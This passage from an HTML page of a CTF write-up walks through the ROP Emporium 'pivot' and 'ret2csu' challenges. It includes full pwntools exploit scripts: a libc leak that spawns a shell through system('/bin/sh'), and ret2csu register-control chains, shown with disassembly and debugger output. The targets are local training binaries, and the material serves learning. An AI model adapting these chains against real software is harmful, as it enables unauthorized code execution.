+[*] Process '/home/kali/ctf/rop/pivot/pivot' stopped with exit code 0 (pid 1837)
+Thank you!
+ROPE{a_placeholder_32byte_flag!}
+[*] Got EOF while reading in interactive
+</code></pre>
+<p>very nice, now that we have this knowledge, we can just leak the address of <code>libc</code>
+to get a shell by calling <code>system</code> with <code>/bin/sh</code> as an argument. you should
+try it yourself.</p>
+<details>
+  <summary>hmm?</summary>
+<pre><code class="language-python">from pwn import *
+
+elf = context.binary = ELF("./pivot")
+libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+rop = ROP(elf)
+p = process()
+
+# gdb.attach(p, "break foothold_function")
+
+padding = b"x" * 40
+
+main_plt = elf.symbols["main"]
+puts_plt = elf.plt["puts"]
+puts_got = elf.got["puts"]
+
+p.recvuntil(b"libpivot\n")
+
+pivot = int(p.recvline().decode("utf-8").split()[-1].strip()[2::], 16)
+log.info(f"pivot location: {hex(pivot)}")
+
+payload = p64(rop.find_gadget(["pop rdi", "ret"])[0]) + p64(puts_got) + p64(puts_plt) + p64(main_plt)
+
+p.sendline(payload)
+
+p.clean()
+
+xchg_rsp_rax = 0x4009bd # somehow ROPgadget can't find "xchg rsp, rax", "ret" but can be searched using commandline (why)
+p.sendline(padding + p64(rop.find_gadget(["pop rax", "ret"])[0]) + p64(pivot) + p64(xchg_rsp_rax))
+
+p.recvline()
+
+leak_puts_bytes = bytearray.fromhex(p.recvline().strip().hex())
+leak_puts_bytes.reverse()
+
+leak_puts = int.from_bytes(leak_puts_bytes)
+log.info(f"leaked puts {hex(leak_puts)}")
+
+base_libc = leak_puts - libc.symbols["puts"]
+
+bin_sh = base_libc + next(libc.search(b"/bin/sh"))
+system = base_libc + libc.symbols["system"]
+
+log.info(f"system location: {hex(system)} with arg {hex(bin_sh)}, we are jumping now!")
+
+p.clean()
+
+p.sendline(padding + p64(rop.find_gadget(["pop rdi", "ret"])[0]) + p64(bin_sh) + p64(system))
+p.interactive()
+</code></pre>
+</details>
+<p>there's also other ways to solve this challenge such as writing <code>got.plt</code> with
+something else, or use one_gadget or loading <code>got.plt</code> into memory, modify it
+and call it using <code>call reg</code>. but i've had enough of it so, nicesu nicesu!!</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="8-ret2csu"><a class="header" href="#8-ret2csu">8. ret2csu</a></h1>
+<p>the final challenge of ROP Emporium, the challenge is similar to <a href="./3.callme.html"><code>callme</code></a>
+which requires us to call a <code>ret2win</code> function with an arguments of
+<code>ret2win(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)</code>
+but this time there's a limited gadgets for us to work with.</p>
+<h3 id="so-whats-ret2csu-exactly"><a class="header" href="#so-whats-ret2csu-exactly">so what's ret2csu exactly?</a></h3>
+<p>ret2csu is a technique that allows us to control registers when gadgets are lacking
+in the binary more information can be found in <a href="https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf">this paper</a></p>
+<p>in this paticular case, the binary imported libc so there's a function called
+<code>__libc_csu_init</code> which is very important for us to uses to control registers.</p>
+<pre><code>gef➤  disas __libc_csu_init
+Dump of assembler code for function __libc_csu_init:
+   0x0000000000400640 &lt;+0&gt;:     push   r15
+   0x0000000000400642 &lt;+2&gt;:     push   r14
+   0x0000000000400644 &lt;+4&gt;:     mov    r15,rdx
+   0x0000000000400647 &lt;+7&gt;:     push   r13
+   0x0000000000400649 &lt;+9&gt;:     push   r12
+   0x000000000040064b &lt;+11&gt;:    lea    r12,[rip+0x20079e]        # 0x600df0
+   0x0000000000400652 &lt;+18&gt;:    push   rbp
+   0x0000000000400653 &lt;+19&gt;:    lea    rbp,[rip+0x20079e]        # 0x600df8
+   0x000000000040065a &lt;+26&gt;:    push   rbx
+   0x000000000040065b &lt;+27&gt;:    mov    r13d,edi
+   0x000000000040065e &lt;+30&gt;:    mov    r14,rsi
+   0x0000000000400661 &lt;+33&gt;:    sub    rbp,r12
+   0x0000000000400664 &lt;+36&gt;:    sub    rsp,0x8
+   0x0000000000400668 &lt;+40&gt;:    sar    rbp,0x3
+   0x000000000040066c &lt;+44&gt;:    call   0x4004d0 &lt;_init&gt;
+   0x0000000000400671 &lt;+49&gt;:    test   rbp,rbp
+   0x0000000000400674 &lt;+52&gt;:    je     0x400696 &lt;__libc_csu_init+86&gt;
+   0x0000000000400676 &lt;+54&gt;:    xor    ebx,ebx
+   0x0000000000400678 &lt;+56&gt;:    nop    DWORD PTR [rax+rax*1+0x0]
+   0x0000000000400680 &lt;+64&gt;:    mov    rdx,r15
+   0x0000000000400683 &lt;+67&gt;:    mov    rsi,r14
+   0x0000000000400686 &lt;+70&gt;:    mov    edi,r13d
+   0x0000000000400689 &lt;+73&gt;:    call   QWORD PTR [r12+rbx*8]
+   0x000000000040068d &lt;+77&gt;:    add    rbx,0x1
+   0x0000000000400691 &lt;+81&gt;:    cmp    rbp,rbx
+   0x0000000000400694 &lt;+84&gt;:    jne    0x400680 &lt;__libc_csu_init+64&gt;
+   0x0000000000400696 &lt;+86&gt;:    add    rsp,0x8
+   0x000000000040069a &lt;+90&gt;:    pop    rbx
+   0x000000000040069b &lt;+91&gt;:    pop    rbp
+   0x000000000040069c &lt;+92&gt;:    pop    r12
+   0x000000000040069e &lt;+94&gt;:    pop    r13
+   0x00000000004006a0 &lt;+96&gt;:    pop    r14
+   0x00000000004006a2 &lt;+98&gt;:    pop    r15
+   0x00000000004006a4 &lt;+100&gt;:   ret
+End of assembler dump.
+</code></pre>
+<p>this is the full disassembly of <code>__libc_csu_init</code>, you might see something that
+represent gadgets here from the line <code>&lt;+90&gt;</code> to <code>&lt;+100&gt;</code> and <code>&lt;+64&gt;</code> to <code>&lt;+73&gt;</code></p>
+<pre><code>   0x000000000040069a &lt;+90&gt;:    pop    rbx
+   0x000000000040069b &lt;+91&gt;:    pop    rbp
+   0x000000000040069c &lt;+92&gt;:    pop    r12
+   0x000000000040069e &lt;+94&gt;:    pop    r13
+   0x00000000004006a0 &lt;+96&gt;:    pop    r14
+   0x00000000004006a2 &lt;+98&gt;:    pop    r15
+   0x00000000004006a4 &lt;+100&gt;:   ret
+</code></pre>
+<pre><code>   0x0000000000400680 &lt;+64&gt;:    mov    rdx,r15
+   0x0000000000400683 &lt;+67&gt;:    mov    rsi,r14
+   0x0000000000400686 &lt;+70&gt;:    mov    edi,r13d
+   0x0000000000400689 &lt;+73&gt;:    call   QWORD PTR [r12+rbx*8]
+</code></pre>
+<p>these's might not look like gadgets at first, but we can actually control 3 of
+the registers for calling a function which are <code>edi</code>, <code>rsi</code> and <code>rdx</code>.</p>
+<p>there're also <code>pop</code> instructions floating around in the binary for <code>rdi</code> and <code>rsi</code>
+but i decided to just use the instructions from <code>__libc_csu_init</code> to do the job.</p>
+<p>note that <code>call QWORD PTR [r12+rbx*8]</code> is not <code>call r12+rbx*8</code>, this instruction
+calculate for the address of <code>r12+rbx*8</code> and then reference it, get the address
+from memory and then call that address.</p>
+<p>let's try to use these to manipulate registers and call <code>ret2win</code>.</p>
+<pre><code class="language-python">from pwn import *
+
+p = process("./ret2csu")
+
+gdb.attach(p, """break ret2win""")
+
+# pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
+pop = 0x40069a
+
+# mov rdx, r15; mov rsi, r14; mov edi, r13d; call qw ptr [r12+rbx*8]
+mov = 0x400680
+
+ret2win = 0x400510
+ret2win_got = 0x601020
+
+arg_1 = 0xdeadbeefdeadbeef
+arg_2 = 0xcafebabecafebabe
+arg_3 = 0xd00df00dd00df00d
+
+padding = b"x" * 40
+
+payload = flat([
+        padding,
+        pop,
+        0,
+        0,
+        ret2win_got,
+        arg_1,
+        arg_2,
+        arg_3,
+        mov,
+],word_size=64)
+
+p.sendline(payload)
+
+p.interactive()
+</code></pre>
+<p>let's try it.</p>
+<pre><code> → 0x7f2a9ae009d7 &lt;ret2win+4&gt;      sub    rsp, 0x30
+   0x7f2a9ae009db &lt;ret2win+8&gt;      mov    QWORD PTR [rbp-0x18], rdi
+   0x7f2a9ae009df &lt;ret2win+12&gt;     mov    QWORD PTR [rbp-0x20], rsi
+   0x7f2a9ae009e3 &lt;ret2win+16&gt;     mov    QWORD PTR [rbp-0x28], rdx
+   0x7f2a9ae009e7 &lt;ret2win+20&gt;     mov    QWORD PTR [rbp-0x10], 0x0
+   0x7f2a9ae009ef &lt;ret2win+28&gt;     movabs rax, 0xdeadbeefdeadbeef
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "ret2csu", stopped 0x7f2a9ae009d7 in ret2win (), reason: BREAKPOINT
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+[#0] 0x7f2a9ae009d7 → ret2win()
+[#1] 0x40068d → __libc_csu_init()
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+gef➤  i r rdi rsi rdx
+rdi            0xdeadbeef          0xdeadbeef
+rsi            0xcafebabecafebabe  0xcafebabecafebabe
+rdx            0xd00df00dd00df00d  0xd00df00dd00df00d
+</code></pre>
+<p>looking at the debugger our rdi is not correct yet but other registers are.
+what can we do here? maybe we can try to <code>pop rdi</code> to <code>0xdeadbeefdeadbeef</code> first
+and then calling the gadgets from <code>csu</code> later on so let's try that.</p>
+<p>from <a href="https://www.scs.stanford.edu/brop/bittau-brop.pdf">this paper</a> we can do
+<code>pop rdi</code> directly by offsetting the <code>pop</code> gadgets from <code>__libc_csu_init</code> and
+here's the new payload.</p>
+<pre><code class="language-python">payload = flat([
+        padding,
+        pop + 0x9,
+        arg_1,
+        pop,
+        0,
+        0,
+        ret2win_got,
+        arg_1,
+        arg_2,
+        arg_3,
+        mov,
+],word_size=64)
+</code></pre>
+<p>let's try it.</p>
+<pre><code> → 0x7fe2490009d7 &lt;ret2win+4&gt;      sub    rsp, 0x30
+   0x7fe2490009db &lt;ret2win+8&gt;      mov    QWORD PTR [rbp-0x18], rdi
+   0x7fe2490009df &lt;ret2win+12&gt;     mov    QWORD PTR [rbp-0x20], rsi
+   0x7fe2490009e3 &lt;ret2win+16&gt;     mov    QWORD PTR [rbp-0x28], rdx
+   0x7fe2490009e7 &lt;ret2win+20&gt;     mov    QWORD PTR [rbp-0x10], 0x0
+   0x7fe2490009ef &lt;ret2win+28&gt;     movabs rax, 0xdeadbeefdeadbeef
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "ret2csu", stopped 0x7fe2490009d7 in ret2win (), reason: BREAKPOINT
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+[#0] 0x7fe2490009d7 → ret2win()
+[#1] 0x40068d → __libc_csu_init()
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+gef➤  i r rdi rsi rdx
+rdi            0xdeadbeef          0xdeadbeef
+rsi            0xcafebabecafebabe  0xcafebabecafebabe
+rdx            0xd00df00dd00df00d  0xd00df00dd00df00d
+</code></pre>
+<p>so that doesn't work, hmm... what can we do now? i stuck here for a while then
+i came up with the idea of what if, i can somehow bypass the <code>call</code> instruction
+and go right to <code>ret</code> so then we can chain more registers to do stuff like <code>pop rdi</code>
+for example.</p>
+<p>after researching for a while i found <a href="https://book.hacktricks.xyz/binary-exploitation/rop-return-oriented-programing/ret2csu#bypassing-the-call-and-reaching-ret">this book</a>
+from hacktricks, looking at it i found that it mentions <code>initPtr</code> and i took a
+dive to see what this is, i assumed that it's the function <code>_init</code> that lives in
+the binary.</p>
+<pre><code>gef➤  disas _init
+Dump of assembler code for function _init:
+   0x00000000004004d0 &lt;+0&gt;:     sub    rsp,0x8
+   0x00000000004004d4 &lt;+4&gt;:     mov    rax,QWORD PTR [rip+0x200b1d]        # 0x600ff8
+   0x00000000004004db &lt;+11&gt;:    test   rax,rax
+   0x00000000004004de &lt;+14&gt;:    je     0x4004e2 &lt;_init+18&gt;
+   0x00000000004004e0 &lt;+16&gt;:    call   rax
+   0x00000000004004e2 &lt;+18&gt;:    add    rsp,0x8
+   0x00000000004004e6 &lt;+22&gt;:    ret
+</code></pre>
+<p>hmm, it's a relatively small function so maybe we can probably use this to bypass
+the call function and get to execute instructions after the <code>call</code> instruction and
+landing at <code>ret</code> instruction, after that we can do <code>pop rdi</code> and then call <code>ret2win</code>
+function.</p>
+<p>but hold on, how do we find where <code>0x4004d0</code> live with in the binary? we can use
+<code>&amp;_DYNAMIC</code> section to find the location of <code>0x4004d0</code> using <code>gdb</code></p>
+<pre><code>gef➤  x/10xg &amp;_DYNAMIC
+0x600e00:       0x0000000000000001      0x0000000000000001
+0x600e10:       0x0000000000000001      0x0000000000000038
+0x600e20:       0x000000000000001d      0x0000000000000078
+0x600e30:       0x000000000000000c      0x00000000004004d0
+0x600e40:       0x000000000000000d      0x00000000004006b4
+
+gef➤  x/xg 0x600e38
+0x600e38:       0x00000000004004d0
+</code></pre>
+<p>so <code>0x600e38</code> it is.</p>
+<p>there's something to consider before writing our script, let's look into <code>__libc_csu_init</code>
+one more time.</p>
+<pre><code>-----
+   0x0000000000400680 &lt;+64&gt;:    mov    rdx,r15
+   0x0000000000400683 &lt;+67&gt;:    mov    rsi,r14
+   0x0000000000400686 &lt;+70&gt;:    mov    edi,r13d
+   0x0000000000400689 &lt;+73&gt;:    call   QWORD PTR [r12+rbx*8]
+   0x000000000040068d &lt;+77&gt;:    add    rbx,0x1
+   0x0000000000400691 &lt;+81&gt;:    cmp    rbp,rbx
+   0x0000000000400694 &lt;+84&gt;:    jne    0x400680 &lt;__libc_csu_init+64&gt;
+   0x0000000000400696 &lt;+86&gt;:    add    rsp,0x8
+   0x000000000040069a &lt;+90&gt;:    pop    rbx
+   0x000000000040069b &lt;+91&gt;:    pop    rbp
+   0x000000000040069c &lt;+92&gt;:    pop    r12
+   0x000000000040069e &lt;+94&gt;:    pop    r13
+   0x00000000004006a0 &lt;+96&gt;:    pop    r14
+   0x00000000004006a2 &lt;+98&gt;:    pop    r15
+   0x00000000004006a4 &lt;+100&gt;:   ret
+End of assembler dump.
+</code></pre>
+<p>after <code>call</code> instruction there's some conditions to be met to reach <code>ret</code> instruction,
+we have to make <code>rbp</code> equal to <code>rbx</code> otherwise it will jump back to <code>mov</code> and
+call again after that we just have to add junks to fill for pop instructions,
+we also have to account for <code>add rsp,0x8</code> with some junks too.</p>
+<p>let's craft the final expliot</p>
+<pre><code class="language-python">from pwn import *
+
+p = process("./ret2csu")
+
+gdb.attach(p, """break ret2win""")
+
+# pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
+pop = 0x40069a
+
+# mov rdx, r15; mov rsi, r14; mov edi, r13d; call qw ptr [r12+rbx*8]
+mov = 0x400680
+
+ret2win = 0x400510
+init_ptr = 0x600e38
+
+arg_1 = 0xdeadbeefdeadbeef
+arg_2 = 0xcafebabecafebabe
+arg_3 = 0xd00df00dd00df00d
+
+padding = b"x" * 40
+
+payload = flat([
+        padding,
+        pop,
+        0, # rbx
+        1, # add one so that rbp is equal to rbx after add rbx,0x1
+        init_ptr,
+        0,
+        arg_2,
+        arg_3,
+        mov,
+        0, # add rsp,0x8 padding
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        pop + 0x9,
+        arg_1,
+        ret2win,
+],word_size=64)
+
+p.sendline(payload)
+
+p.interactive()
+</code></pre>
+<p>let's run it!</p>
+<pre><code>$ python solve.py
+[+] Starting local process './ret2csu': pid 2083
+[*] running in new terminal: ['/usr/bin/gdb', '-q', './ret2csu', '2083', '-x', '/tmp/pwnb34fq9vj.gdb']
+[+] Waiting for debugger: Done
+[*] Switching to interactive mode
+ret2csu by ROP Emporium
+x86_64
+
+Check out https://ropemporium.com/challenge/ret2csu.html for information on how to solve this challenge.
+
+&gt; Thank you!
+ROPE{a_placeholder_32byte_flag!}
+[*] Process './ret2csu' stopped with exit code 0 (pid 2083)
+[*] Got EOF while reading in interactive
+</code></pre>
+<p>andddddddd it's done! nicesu nicesu!</p>
+<p>we can also use <code>_fini</code> too since it's basically doing nothing</p>
+<pre><code>gef➤  disas _fini
+Dump of assembler code for function _fini:
+   0x00000000004006b4 &lt;+0&gt;:     sub    rsp,0x8
+   0x00000000004006b8 &lt;+4&gt;:     add    rsp,0x8
+   0x00000000004006bc &lt;+8&gt;:     ret
+</code></pre>
+<p>either way is fine, we since we pwned it anyway haha.</p>
+<p>alright!, we pwned all of ROP Emporium challenges, if you stick around
+until this point, thank you so much, i hope you had fun doing these challenges,
+like i did. see you next time!</p>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+
+            </nav>
+
+        </div>
+
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="elasticlunr.min.js"></script>
+        <script src="mark.min.js"></script>
+        <script src="searcher.js"></script>
+
+        <script src="clipboard.min.js"></script>
+        <script src="highlight.js"></script>
+        <script src="book.js"></script>
+
+        <!-- Custom JS scripts -->
+
+        <script>
+        window.addEventListener('load', function() {
+            window.setTimeout(window.print, 100);
+        });
+        </script>
+
+    </div>
+    </body>
+</html>
